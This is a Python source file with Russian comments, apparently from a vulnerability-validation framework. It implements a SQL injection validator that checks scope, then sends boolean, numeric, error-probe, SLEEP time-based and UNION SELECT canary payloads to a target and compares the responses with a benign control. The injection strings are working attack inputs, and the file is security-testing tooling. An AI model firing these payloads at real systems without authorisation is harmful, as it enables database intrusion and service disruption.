"""SQL Injection — boolean-based differential, echo-immune, benign-controlled.

Расширенный контракт M1 (hardening PR):

1. **Boolean-diff** (базовый) — TRUE≠FALSE ПОСЛЕ нормализации, FALSE похож на
   benign-control, TRUE отличается от benign. status_diff → 0.90, body-only
   diff после norm → 0.65.
2. **Numeric params** — если `candidate.meta["param_type"] == "numeric"` или
   `meta["param_value"]` парсится как int, используем шаблоны без кавычек
   (`{v} OR 1=1` / `{v} AND 1=2`), чинит кейс с `productId=7`.
3. **Error-based DB fingerprint** — доп. probe `'`, ищем сигнатуры MySQL/
   PostgreSQL/SQLite/MSSQL/Oracle. Строгий anti-FP: сигнатура ДОЛЖНА быть в
   err-response И отсутствовать в benign. Не PASS сам по себе — только
   апгрейд/сохранение confidence при боевом boolean-diff, либо LOW-tier PASS.
4. **Time-based** — opt-in (`meta["timing_based"] == True`). SLEEP-payload;
   delta ≥ 4s; повторный replay для стабильности. Только когда boolean-diff
   не сработал (защита от бесполезной задержки).
5. **UNION canary** — после boolean-PASS+status_diff шлём
   `' UNION SELECT '<canary>'-- ` и проверяем токен в теле. Если canary
   отразился → data-extraction proof, confidence 0.95.
6. **Replays через `ctx.replays`** — раньше игнорировался; теперь цикл
   TRUE/FALSE/benign повторяется `ctx.replays` раз; `required = 2 if
   replays>1 else 1`. Устраняет FP из flaky-инфраструктуры.
7. **WAF detection** — если `status_true == status_false ∈ {403,406,429,501,
   503}` И `status_benign` не в этом множестве, значит боевой payload
   блокируется WAF-ом, а benign — нет. `reason="waf_blocked"`, `is_real=False`,
   `extra["needs_proof"] = True` — сигнал оркестратору, что нужен другой
   вектор.

Инвариант: никаких исключений наружу — обёрнуто в `Verdict` через
`as_failure()`. Никаких headless/heavy-deps: только httpx+stdlib.
"""

from __future__ import annotations

import re
import secrets
import time
from typing import Any

import httpx

from orchestrator.types import Candidate, ValidatorContext, Verdict
from tools.core.vulnerability_class import VulnerabilityClass
from tools.validators import registry
from tools.validators.base import (
    BaseValidator,
    PayloadVariant,
    ValidationEvidence,
    check_scope,
)

_NAME = "sqli_boolean_v1"
_SUCCESS_STATUS = frozenset({200, 201, 202, 203, 204, 206, 301, 302, 303, 307, 308})
_WAF_STATUS_CODES = frozenset({403, 406, 429, 501, 503})

# Строковые payload'ы (default).
_TRUE_PAYLOAD = "' OR '1'='1' -- "
_FALSE_PAYLOAD = "' OR '1'='2' -- "

# Числовые шаблоны (для integer-param'ов типа productId=7).
_NUMERIC_TRUE_TEMPLATE = "{v} OR 1=1"
_NUMERIC_FALSE_TEMPLATE = "{v} AND 1=2"
_NUMERIC_DEFAULT_BASE = "1"

# Benign-контроль для numeric-mode — гарантированно "нет строк", чтобы совпадать
# с семантикой FALSE-payload (`{v} AND 1=2` возвращает 0 rows). Крайне маловероятно
# как реальный primary key. Стабильно между replays.
_NUMERIC_BENIGN_VALUE = "-2147483647"

# Error-based probe.
_ERROR_PROBE_PAYLOAD = "'"

# Time-based.
_TIME_SLEEP_SECONDS = 5
_TIME_DELTA_THRESHOLD_S = 4.0
_TIME_SLEEP_TEMPLATE = "' AND SLEEP({s}) -- "
_TIME_SLEEP_NUMERIC_TEMPLATE = "{v} AND SLEEP({s})"

# UNION canary.
_UNION_STRING_TEMPLATE = "' UNION SELECT '{canary}'-- "
_UNION_NUMERIC_TEMPLATE = "{v} UNION SELECT '{canary}'-- "

# Confidences.
_CONF_STATUS_DIFF = 0.90
_CONF_BODY_ONLY = 0.65
_CONF_UNION_EXTRACT = 0.95
_CONF_TIME_BASED = 0.85
_CONF_ERROR_BASED = 0.70

# DB-error signatures — bytes, lowercase (сравниваем на normalized-lowercased body).
_DB_ERROR_SIGNATURES: dict[str, tuple[bytes, ...]] = {
    "mysql": (
        b"you have an error in your sql syntax",
        b"warning: mysql_",
        b"mysqlclient.exceptions",
        b"mysqlnd cannot connect",
        b"check the manual that corresponds to your mysql server version",
    ),
    "postgres": (
        b"unterminated quoted string at or near",
        b"psycopg2.errors",
        b"psycopg2.programmingerror",
        b"pg_query():",
        b"syntax error at or near",
    ),
    "sqlite": (
        b"sqlite3.operationalerror",
        b"sqlite error",
        b"unrecognized token:",
        b"near \"'\": syntax error",
    ),
    "mssql": (
        b"unclosed quotation mark after the character string",
        b"microsoft sql server",
        b"microsoft odbc sql server driver",
        b"[microsoft][sql server]",
        b"incorrect syntax near",
    ),
    "oracle": (
        b"ora-00933",
        b"ora-01756",
        b"ora-00921",
        b"quoted string not properly terminated",
    ),
}

_DYNAMIC_TOKEN_PATTERNS: tuple[re.Pattern[bytes], ...] = (
    re.compile(rb'<meta\s+name="csrf-token"\s+content="[^"]*"\s*/?>', re.IGNORECASE),
    re.compile(
        rb'<input[^>]*name=["\'](?:csrf|_token|authenticity_token)[^>]*value=["\'][^"\']*["\'][^>]*>',
        re.IGNORECASE,
    ),
    re.compile(rb'nonce=["\'][^"\']+["\']', re.IGNORECASE),
    re.compile(rb"[?&](?:ts|_ts|t|_)=\d{6,}"),
    re.compile(rb"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?"),
    re.compile(rb"\b[0-9a-fA-F]{32,}\b"),
)


def _canary(prefix: str) -> str:
    return f"{prefix}_{secrets.token_hex(8)}"


def _normalize_body(body: bytes, remove: list[str]) -> bytes:
    normalized = body
    for needle in remove:
        if needle:
            normalized = normalized.replace(needle.encode("utf-8", errors="replace"), b"")
    for pattern in _DYNAMIC_TOKEN_PATTERNS:
        normalized = pattern.sub(b"", normalized)
    return normalized


def _infer_numeric_baseline(candidate: Candidate) -> str | None:
    """Определить, использовать ли numeric-режим и с какой базой.

    Возвращает str-представление базового числового значения, если:
      • `meta["param_type"]` явно равно `"numeric"` (тогда база = `meta.get(
        "param_value", "1")` если парсится, иначе "1"), ИЛИ
      • `meta["param_value"]` парсится как int (тогда база = само значение).

    Иначе `None` → используем строковые payload'ы.
    """
    if not isinstance(candidate.meta, dict):
        return None

    param_type = str(candidate.meta.get("param_type", "")).lower().strip()
    raw_value = candidate.meta.get("param_value")

    if param_type == "numeric":
        if raw_value is not None:
            try:
                return str(int(str(raw_value).strip()))
            except (ValueError, TypeError):
                return _NUMERIC_DEFAULT_BASE
        return _NUMERIC_DEFAULT_BASE

    if raw_value is not None:
        try:
            return str(int(str(raw_value).strip()))
        except (ValueError, TypeError):
            return None

    return None


def _extract_db_fingerprint(body: bytes) -> str | None:
    """Найти сигнатуру ошибки СУБД в теле ответа. Возвращает имя БД или None."""
    if not body:
        return None
    lowered = body.lower()
    for db_name, sigs in _DB_ERROR_SIGNATURES.items():
        for sig in sigs:
            if sig in lowered:
                return db_name
    return None


@registry.register(VulnerabilityClass.SQLI)
class SQLiValidator(BaseValidator):
    """Boolean-based SQLi + error/time/union hardening (M1 extended contract)."""

    @property
    def name(self) -> str:
        return _NAME

    @property
    def vulnerability_class(self) -> VulnerabilityClass:
        return VulnerabilityClass.SQLI

    def generate_payload(self, variant: PayloadVariant) -> str:
        return _TRUE_PAYLOAD if variant == "true" else _FALSE_PAYLOAD

    def compare_responses(self, resp_true: Any, resp_false: Any) -> bool:
        if not (isinstance(resp_true, dict) and isinstance(resp_false, dict)):
            return False
        st_t = int(resp_true.get("status", 0))
        st_f = int(resp_false.get("status", 0))
        if st_t != st_f:
            return True
        norm_t = resp_true.get("sha256_norm")
        norm_f = resp_false.get("sha256_norm")
        if norm_t and norm_f:
            return bool(norm_t != norm_f)
        return False

    def validate(self, candidate: Candidate, ctx: ValidatorContext) -> Verdict:
        try:
            oos = check_scope(ctx, candidate.target)
            if oos == "out_of_scope":
                return self._out_of_scope_verdict(candidate.target)

            transport = ctx.extra.get("http_transport") if ctx.extra else None

            # Numeric vs string режим.
            numeric_base = _infer_numeric_baseline(candidate)
            if numeric_base is not None:
                pt = _NUMERIC_TRUE_TEMPLATE.format(v=numeric_base)
                pf = _NUMERIC_FALSE_TEMPLATE.format(v=numeric_base)
                # НЕ используем `numeric_base` как benign — оно возвращает валидную
                # запись, а FALSE-payload (`{v} AND 1=2`) — пусто. Сравнивать нужно
                # с "гарантированно пусто", иначе `false_like_benign` всегда False.
                bng_value = _NUMERIC_BENIGN_VALUE
                mode = "numeric"
            else:
                pt = _TRUE_PAYLOAD
                pf = _FALSE_PAYLOAD
                bng_value = _canary("bng")
                mode = "string"

            # Замыкаем всё в один client — переиспользуем connection pool.
            with httpx.Client(
                transport=transport,
                timeout=10.0,
                verify=ctx.tls_verify,
                follow_redirects=False,
            ) as client:
                bng_pw = _canary("pw")

                # Replays: сколько раундов гоняем и сколько нужно «diff-yes».
                replays_total = max(1, int(getattr(ctx, "replays", 1) or 1))
                required = 2 if replays_total > 1 else 1
                rounds: list[dict[str, Any]] = []
                diff_yes_count = 0

                for _ in range(replays_total):
                    rt = self._send(client, candidate, ctx, pt)
                    rf = self._send(client, candidate, ctx, pf)
                    rc = self._send(client, candidate, ctx, bng_value, pw_value=bng_pw)

                    strip_list = [pt, pf, bng_value, bng_pw]
                    norm_t = _normalize_body(rt["body"], strip_list)
                    norm_f = _normalize_body(rf["body"], strip_list)
                    norm_c = _normalize_body(rc["body"], strip_list)

                    sha_norm_t = ValidationEvidence.sha256_of(norm_t)
                    sha_norm_f = ValidationEvidence.sha256_of(norm_f)
                    sha_norm_c = ValidationEvidence.sha256_of(norm_c)

                    st_t = int(rt["status"])
                    st_f = int(rf["status"])
                    st_c = int(rc["status"])

                    status_diff = st_t != st_f
                    body_diff_after_norm = sha_norm_t != sha_norm_f
                    normalized_diff = status_diff or body_diff_after_norm
                    true_differs_from_benign = (st_t != st_c) or (sha_norm_t != sha_norm_c)
                    false_like_benign = (st_f == st_c) and (sha_norm_f == sha_norm_c)

                    round_pass = bool(
                        normalized_diff and true_differs_from_benign and false_like_benign
                    )
                    if round_pass:
                        diff_yes_count += 1

                    rounds.append(
                        {
                            "rt": rt,
                            "rf": rf,
                            "rc": rc,
                            "sha_norm_t": sha_norm_t,
                            "sha_norm_f": sha_norm_f,
                            "sha_norm_c": sha_norm_c,
                            "st_t": st_t,
                            "st_f": st_f,
                            "st_c": st_c,
                            "status_diff": status_diff,
                            "body_diff_after_norm": body_diff_after_norm,
                            "normalized_diff": normalized_diff,
                            "true_differs_from_benign": true_differs_from_benign,
                            "false_like_benign": false_like_benign,
                            "round_pass": round_pass,
                        }
                    )

                # Берём последний раунд как основной для артефактов.
                last = rounds[-1]

                # WAF detection: считаем, что "стабильно" — если во ВСЕХ раундах
                # TRUE == FALSE ∈ WAF-статусах, а benign — нет.
                waf_blocked = (
                    all(
                        r["st_t"] == r["st_f"] and r["st_t"] in _WAF_STATUS_CODES
                        for r in rounds
                    )
                    and all(r["st_c"] not in _WAF_STATUS_CODES for r in rounds)
                )

                # Базовое решение.
                is_real = False
                confidence = 0.0
                reason = ""
                diff_reason = ""
                extra_flags: dict[str, Any] = {
                    "mode": mode,
                    "replays_total": replays_total,
                    "replays_diff_yes": diff_yes_count,
                    "replays_required": required,
                    "waf_blocked": waf_blocked,
                    "needs_proof": False,
                }

                if waf_blocked:
                    reason = "waf_blocked"
                    diff_reason = "waf_status_uniform_but_benign_ok"
                    extra_flags["needs_proof"] = True
                elif diff_yes_count >= required:
                    is_real = True
                    reason = "boolean_diff_confirmed"
                    if last["status_diff"]:
                        diff_reason = "status_differential"
                        confidence = _CONF_STATUS_DIFF
                    else:
                        diff_reason = "body_differential_after_normalization"
                        confidence = _CONF_BODY_ONLY
                elif not last["normalized_diff"]:
                    reason = "no_boolean_diff"
                    diff_reason = "no_diff_after_normalization"
                elif not last["true_differs_from_benign"]:
                    reason = "true_matches_benign"
                    diff_reason = "true_indistinguishable_from_benign"
                elif not last["false_like_benign"]:
                    reason = "false_does_not_match_benign"
                    diff_reason = "false_diverges_from_benign_control"
                else:
                    # Раунд-диф был не стабильно (< required).
                    reason = "boolean_diff_unstable"
                    diff_reason = "insufficient_replays"

                # UNION canary — только после boolean-PASS со status_diff.
                union_extracted = False
                union_canary_value: str | None = None
                if is_real and last["status_diff"]:
                    union_canary_value = _canary("un")
                    if numeric_base is not None:
                        union_payload = _UNION_NUMERIC_TEMPLATE.format(
                            v=numeric_base, canary=union_canary_value
                        )
                    else:
                        union_payload = _UNION_STRING_TEMPLATE.format(canary=union_canary_value)
                    try:
                        ru = self._send(client, candidate, ctx, union_payload, pw_value=bng_pw)
                        if union_canary_value.encode("ascii") in (ru["body"] or b""):
                            union_extracted = True
                            confidence = _CONF_UNION_EXTRACT
                            reason = "union_canary_extracted"
                            diff_reason = "data_extraction_via_union_confirmed"
                    except Exception:  # noqa: S110
                        # UNION probe не критичен, если сломался — оставляем boolean-PASS.
                        pass

                extra_flags["union_probe_sent"] = union_canary_value is not None
                extra_flags["union_canary_reflected"] = union_extracted

                # Error-based fingerprint — доп. probe `'`.
                # Всегда полезно как метаданные; если boolean НЕ прошёл — можем
                # апгрейдить до LOW-tier PASS при строгом anti-FP.
                err_probe = self._send(client, candidate, ctx, _ERROR_PROBE_PAYLOAD)
                err_body_norm = _normalize_body(
                    err_probe["body"], [_ERROR_PROBE_PAYLOAD, bng_value, bng_pw]
                )
                benign_body_norm = _normalize_body(
                    last["rc"]["body"], [bng_value, bng_pw]
                )
                err_fp = _extract_db_fingerprint(err_body_norm)
                benign_fp = _extract_db_fingerprint(benign_body_norm)
                error_based_confirmed = bool(
                    err_fp is not None and err_fp != benign_fp
                )
                extra_flags["db_error_fingerprint"] = err_fp
                extra_flags["db_error_fingerprint_in_benign"] = benign_fp
                extra_flags["error_based_confirmed"] = error_based_confirmed
                extra_flags["error_probe_status"] = int(err_probe["status"])

                if not is_real and not waf_blocked and error_based_confirmed:
                    is_real = True
                    reason = "error_based_confirmed"
                    diff_reason = f"db_error_signature:{err_fp}"
                    confidence = _CONF_ERROR_BASED

                # Time-based — opt-in.
                timing_based_enabled = bool(
                    candidate.meta.get("timing_based") is True
                )
                time_based_confirmed = False
                time_delta_s: float | None = None
                extra_flags["timing_based_enabled"] = timing_based_enabled

                if timing_based_enabled and not is_real and not waf_blocked:
                    if numeric_base is not None:
                        sleep_payload = _TIME_SLEEP_NUMERIC_TEMPLATE.format(
                            v=numeric_base, s=_TIME_SLEEP_SECONDS
                        )
                    else:
                        sleep_payload = _TIME_SLEEP_TEMPLATE.format(s=_TIME_SLEEP_SECONDS)
                    # Два прогона: первый + retry для стабильности.
                    delta_ok = 0
                    last_delta: float = 0.0
                    for _ in range(2):
                        rs = self._send(client, candidate, ctx, sleep_payload)
                        last_delta = float(rs["timing_ms"]) / 1000.0
                        if last_delta >= _TIME_DELTA_THRESHOLD_S:
                            delta_ok += 1
                    time_delta_s = last_delta
                    if delta_ok >= 2:
                        time_based_confirmed = True
                        is_real = True
                        reason = "time_based_confirmed"
                        diff_reason = f"sleep_delay_ge_{int(_TIME_DELTA_THRESHOLD_S)}s"
                        confidence = _CONF_TIME_BASED

                extra_flags["time_based_confirmed"] = time_based_confirmed
                if time_delta_s is not None:
                    extra_flags["time_delta_s_last"] = round(time_delta_s, 3)

                # Собираем artifacts из последнего раунда (стабильно с прежним поведением).
                ev = ValidationEvidence(
                    payload_true=pt,
                    payload_false=pf,
                    payload_benign=f"{bng_value}:{bng_pw}",
                    status_true=int(last["rt"]["status"]),
                    status_false=int(last["rf"]["status"]),
                    status_benign=int(last["rc"]["status"]),
                    len_true=int(last["rt"]["len"]),
                    len_false=int(last["rf"]["len"]),
                    len_benign=int(last["rc"]["len"]),
                    sha256_true=str(last["rt"]["sha256"]),
                    sha256_false=str(last["rf"]["sha256"]),
                    sha256_benign=str(last["rc"]["sha256"]),
                    timing_ms_true=float(last["rt"]["timing_ms"]),
                    timing_ms_false=float(last["rf"]["timing_ms"]),
                    timing_ms_benign=float(last["rc"]["timing_ms"]),
                    diff_reason=diff_reason,
                    normalized_diff=bool(last["normalized_diff"]),
                    false_like_benign=bool(last["false_like_benign"]),
                    true_differs_from_benign=bool(last["true_differs_from_benign"]),
                    extra={
                        "sha256_norm_true": last["sha_norm_t"],
                        "sha256_norm_false": last["sha_norm_f"],
                        "sha256_norm_benign": last["sha_norm_c"],
                        "status_differential": bool(last["status_diff"]),
                        "body_differential_after_norm": bool(last["body_diff_after_norm"]),
                        "true_in_success_family": int(last["st_t"]) in _SUCCESS_STATUS,
                        "false_in_success_family": int(last["st_f"]) in _SUCCESS_STATUS,
                        **extra_flags,
                    },
                )

                if is_real:
                    evidence_text = (
                        f"SQLi ({reason}) на {candidate.param or '?'}@{candidate.path}: "
                        f"mode={mode}, TRUE→HTTP {last['st_t']}, FALSE→HTTP {last['st_f']}, "
                        f"benign→HTTP {last['st_c']}. diff_reason={diff_reason}."
                    )
                else:
                    evidence_text = (
                        f"SQLi НЕ подтверждён на {candidate.param or '?'}@{candidate.path}: "
                        f"mode={mode}, TRUE→{last['st_t']}, FALSE→{last['st_f']}, "
                        f"benign→{last['st_c']} ({reason})."
                    )

                return Verdict(
                    is_real=is_real,
                    evidence=evidence_text,
                    confidence=confidence,
                    bug_class=self.vulnerability_class.value,
                    validator=self.name,
                    reason=reason,
                    replays_passed=diff_yes_count if is_real else 0,
                    replays_total=replays_total,
                    artifacts=ev.to_dict(),
                )
        except Exception as e:
            return self.as_failure(e)

    def _send(
        self,
        client: httpx.Client,
        candidate: Candidate,
        ctx: ValidatorContext,
        inj_value: str,
        pw_value: str | None = None,
    ) -> dict[str, Any]:
        base = ctx.target.rstrip("/")
        path = candidate.path or "/"
        method = (candidate.method or "POST").upper()
        param = candidate.param or "username"
        pw_param = candidate.meta.get("password_param", "password")
        pw = pw_value if pw_value is not None else candidate.meta.get("password_value", "x")
        ctype = str(candidate.meta.get("content_type", "form")).lower()
        headers = {**(ctx.program_headers or {}), **(candidate.headers or {})}

        params: dict[str, str] = {param: inj_value}
        if pw_param:
            params[pw_param] = pw
        extra_fields = candidate.meta.get("extra_fields") or {}
        if isinstance(extra_fields, dict):
            for k, v in extra_fields.items():
                params[str(k)] = str(v)

        url = base + path
        start = time.monotonic()
        if method == "GET":
            resp = client.get(url, params=params, headers=headers)
        elif ctype == "json":
            resp = client.request(method, url, json=params, headers=headers)
        else:
            resp = client.request(method, url, data=params, headers=headers)
        elapsed_ms = round((time.monotonic() - start) * 1000.0, 3)

        body = resp.content or b""
        return {
            "status": resp.status_code,
            "body": body,
            "len": len(body),
            "sha256": ValidationEvidence.sha256_of(body),
            "timing_ms": elapsed_ms,
        }
